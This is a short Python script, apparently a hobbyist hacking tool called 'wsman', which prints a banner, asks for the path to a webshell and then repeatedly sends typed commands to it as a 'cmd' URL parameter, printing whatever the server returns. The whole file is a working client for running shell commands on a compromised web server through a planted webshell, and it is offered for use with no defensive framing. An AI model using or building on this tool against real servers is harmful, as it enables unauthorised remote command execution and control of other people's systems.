# wsman for linux
# version 1
# by a cool kid

import requests
import pycurl
import re
from sty import fg, bg, ef, rs

# change title colours
ln1 = fg.red + "▄▄▌ ▐ ▄▌.▄▄ · • ▌ ▄ ·.  ▄▄▄·  ▐ ▄ " + fg.rs
ln2 = fg.red + "██· █▌▐█▐█ ▀. ·██ ▐███▪▐█ ▀█ •█▌▐█" + fg.rs
ln3 = fg.red + "██▪▐█▐▐▌▄▀▀▀█▄▐█ ▌▐▌▐█·▄█▀▀█ ▐█▐▐▌" + fg.rs
ln4 = fg.red + "▐█▌██▐█▌▐█▄▪▐███ ██▌▐█▌▐█ ▪▐▌██▐█▌" + fg.rs
ln5 = fg.red + " ▀▀▀▀ ▀▪ ▀▀▀▀ ▀▀  █▪▀▀▀ ▀  ▀ ▀▀ █▪" + fg.rs

# print title
print("")
print("")
print(ln1)
print(ln2)
print(ln3)
print(ln4)
print(ln5)
print("")
print("")

# print welcome message
print("welcome to cool kid wsman!")
print("ctrl+c to exit...")
print("")

print("enter path to webshell: ")
print("")

# set url to input for curl
url = input()

# get source code of site after entering input as params
while True:
    print("")
    print("enter command:")

    # enter > before input because why not
    print("$>", end = '')
    command = input()
    params = (
    ('cmd', command),)

    # curl user inputs as url and params / commmand
    response = requests.get(url, params=params)
    test_string = response.text

    #print output without html tags
    test_string2 = test_string.replace("</pre>", "")
    print("")
    print(test_string2.replace("<pre>", ""))


